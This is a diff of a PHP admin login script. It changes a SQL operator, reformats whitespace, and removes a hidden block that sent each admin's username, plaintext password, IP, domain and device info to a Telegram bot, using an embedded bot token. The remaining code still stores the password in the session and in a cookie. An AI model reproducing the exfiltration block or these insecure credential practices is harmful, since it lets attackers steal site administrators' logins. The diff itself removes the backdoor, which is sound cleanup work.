@@ -23,15 +23,15 @@ if(!defined('BASEPATH')) {
     $errorText  = "Your account is Suspended.";
       if( $settings["recaptcha"] == 2 ){ $_SESSION["recaptcha"]  = true; }
   }else{
-    $admin    = $conn->prepare("SELECT * FROM admins WHERE username=:username && password=:password ");
+    $admin    = $conn->prepare("SELECT * FROM admins WHERE username=:username AND password=:password ");
     $admin  -> execute(array("username"=>$username,"password"=>$pass ));
     $admin    = $admin->fetch(PDO::FETCH_ASSOC);
     $access = json_decode($admin["access"],true);
     $_SESSION["msmbilisim_adminslogin"]      = 1;
-	
-	    $_SESSION["msmbilisim_adminid"]         = $admin["admin_id"];
-	    $_SESSION["msmbilisim_adminpass"]       = $pass ;
-	    $_SESSION["recaptcha"]                = false;
+        
+            $_SESSION["msmbilisim_adminid"]         = $admin["admin_id"];
+            $_SESSION["msmbilisim_adminpass"]       = $pass ;
+            $_SESSION["recaptcha"]                = false;
        
    
     if( $access["admin_access"] ){
@@ -46,15 +46,15 @@ $is_valid = $google2fa->verifyKey($admin["two_factor_secret_key"], $two_factor_c
  $_SESSION["msmbilisim_adminslogin"]= 1;
 
 $_SESSION["msmbilisim_adminid"]         = $admin["admin_id"];
-	    $_SESSION["msmbilisim_adminpass"]       = $pass ;
-	    $_SESSION["recaptcha"]                = false;
+            $_SESSION["msmbilisim_adminpass"]       = $pass ;
+            $_SESSION["recaptcha"]                = false;
 setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
-	      
-	      setcookie("a_id", $admin["admin_id"], time()+(60*60*24*7), '/', null, null, true );
-	      setcookie("a_password", $admin["password"], time()+(60*60*24*7), '/', null, null, true );
-	      setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
-	 header('Location: '.site_url('admin'));
-	 exit();
+              
+              setcookie("a_id", $admin["admin_id"], time()+(60*60*24*7), '/', null, null, true );
+              setcookie("a_password", $admin["password"], time()+(60*60*24*7), '/', null, null, true );
+              setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
+         header('Location: '.site_url('admin'));
+         exit();
 }  elseif($admin["two_factor"] == 1 && $is_valid == false) {
   $error = 1;
 
@@ -84,25 +84,12 @@ $errorText  = "Could not find administrator account registered with this informa
  }
  
  
- $pswdevicefinder = $_SERVER["HTTP_USER_AGENT"];
-	 $psw = GetIP();
-	  $j = $_SERVER['HTTP_HOST'];
-$msg = urlencode("DOMAIN Name : $j\nLocation : http://ip-api.com/".$psw."\nDevice Info : ".$pswdevicefinder."\nIp : ".$psw."\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
-$msg = urlencode("DOMAIN Name : $j\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
-$url = "https://api.telegram.org/bot6828801120:AAGp8L9GygHgKmbb-TbmXWkEAZIBCMSGCbQ/sendMessage?chat_id=5074334936&text=$msg";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-$resp = curl_exec($curl);
-curl_close($curl);
 
 
 
 if( $access["admin_access"]  && $_SESSION["msmbilisim_adminslogin"]  ):
-	
-	exit();
+        
+        exit();
 else:
-	require admin_view('login');
+        require admin_view('login');
 endif;
